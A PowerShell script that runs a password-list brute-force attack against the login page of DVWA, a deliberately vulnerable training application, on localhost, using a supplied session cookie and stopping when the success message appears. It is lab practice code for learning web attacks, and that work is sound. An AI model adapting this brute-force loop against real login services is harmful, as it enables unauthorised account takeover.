function CrackDVWABruteforcePlayground {

    # Set request parameter
    param (
        [string]$username,
        [string]$phpSessionID
    )

    $passwordFilePath = "resource\credentials_top_10k.txt"
    $tryingCount = 1

    try {

        # Read password trying file line by line
        $lines = Get-Content -Path $passwordFilePath

        foreach ($line in $lines) {
            $password = $line.Trim()
            Write-Host ("[~] Conducting bruteforcing {0} times for user @{1} => {2}" -f $tryingCount, $username, $password)
        
            # Prepare URL
            $uri = "http://localhost/vulnerabilities/brute/"
        
            # Prepare and send payload
            $params = @{
                "username" = $username
                "password" = $password
                "Login"    = "Login"
            }

            $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
            
            # Setting cookies - security:low
            $cookieSecurityLevel = New-Object System.Net.Cookie
            $cookieSecurityLevel.Name = "security"
            $cookieSecurityLevel.Value = "low"
            $cookieSecurityLevel.Domain = "localhost"
        
            # Setting cookies - security:PHPSESSID
            $cookiePHPSESSID = New-Object System.Net.Cookie
            $cookiePHPSESSID.Name = "PHPSESSID"
            $cookiePHPSESSID.Value = $phpSessionID
            $cookiePHPSESSID.Domain = "localhost"
        
            # Registering custom cookies to the web request via $session(-WebSession)
            $session.Cookies.Add($cookieSecurityLevel)
            $session.Cookies.Add($cookiePHPSESSID)
        
            # Send requests with payload and session ID
            $response = Invoke-WebRequest -Uri $uri -Method Get -Body $params -WebSession $session
            $tryingCount++
        
            # Check if the request was successful (status code 200)
            if ($response.StatusCode -eq 200) {
                if ($response.Content.Contains("Welcome to the password protected")) {
                    Write-Host ("[!] Found an exact password for user @{0} => ""{1}""" -f $username, $password)
                    break
                }
            } else {
                Write-Host ("[X] Request failed with status code: {0}" -f $response.StatusCode)
                return
            }
        }
    } catch {
        Write-Host ("An error occurred: {0}" -f $_.Exception.Message)
    }
}

# Prepare two parameters
# - ID(string) of the account that you targeted
# - PHPSESSID(string) of your local DVWA account
CrackDVWABruteforcePlayground -username "admin" -phpSessionID "t8g6kc743kqs4t0e05srgion46"
